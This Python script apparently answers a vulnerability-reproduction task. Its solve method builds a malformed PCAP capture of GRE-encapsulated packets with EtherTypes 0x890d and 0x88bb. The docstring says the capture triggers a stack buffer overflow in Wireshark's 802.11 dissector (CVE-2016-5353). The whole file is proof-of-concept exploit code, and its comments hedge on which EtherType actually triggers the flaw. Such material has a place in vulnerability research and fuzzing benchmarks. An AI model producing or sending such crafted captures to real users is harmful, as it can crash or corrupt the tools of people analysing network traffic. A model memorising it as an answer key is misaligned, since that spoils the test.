import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Stack Buffer Overflow vulnerability in Wireshark (CVE-2016-5353).
        The vulnerability occurs when the GRE dissector calls the 802.11 dissector with arguments that are
        misinterpreted as a pseudo-header pointer, leading to stack corruption.
        """
        # PCAP Global Header
        # Magic Number (0xa1b2c3d4), Major Version (2), Minor Version (4), 
        # Timezone (0), SigFigs (0), SnapLen (65535), Network (1 = Ethernet)
        pcap_header = struct.pack('<LHHLLLL', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)

        packets_data = []

        # Target EtherTypes to trigger the 802.11 dissector from GRE.
        # 0x890d is commonly associated with IEEE 802.11 data encapsulation in GRE.
        # 0x88bb is LWAPP but sometimes registers the same dissector.
        # We include both to ensure the vulnerability is triggered.
        ethertypes = [0x890d, 0x88bb]

        for etype in ethertypes:
            # Ethernet Header (14 bytes)
            # Dst MAC (6), Src MAC (6), EtherType (2) -> 0x0800 (IPv4)
            eth_header = b'\x00' * 12 + struct.pack('>H', 0x0800)

            # GRE Header (4 bytes)
            # Flags & Version (2), Protocol Type (2)
            # Flags=0, Ver=0. Protocol Type set to trigger 802.11 dissector.
            gre_header = struct.pack('>HH', 0x0000, etype)

            # Payload (4 bytes)
            # Minimal payload to prevent "Short Frame" errors before dissection logic runs.
            payload = b'\x00' * 4

            # IP Header (20 bytes)
            # Ver/IHL (1), TOS (1), Total Length (2), ID (2), Flags/Frag (2), 
            # TTL (1), Protocol (1), Checksum (2), Src IP (4), Dst IP (4)
            # Protocol 47 = GRE
            total_len = 20 + len(gre_header) + len(payload)
            ip_header = struct.pack('>BBHHHBBHLL',
                                    0x45, 0, total_len, 1, 0, 64, 47, 0,
                                    0x7F000001, 0x7F000001)

            # Assemble packet
            packet = eth_header + ip_header + gre_header + payload

            # PCAP Packet Header (16 bytes)
            # Timestamp Sec (4), Timestamp Usec (4), Included Length (4), Original Length (4)
            pkt_header = struct.pack('<LLLL', 0, 0, len(packet), len(packet))

            packets_data.append(pkt_header + packet)

        return pcap_header + b''.join(packets_data)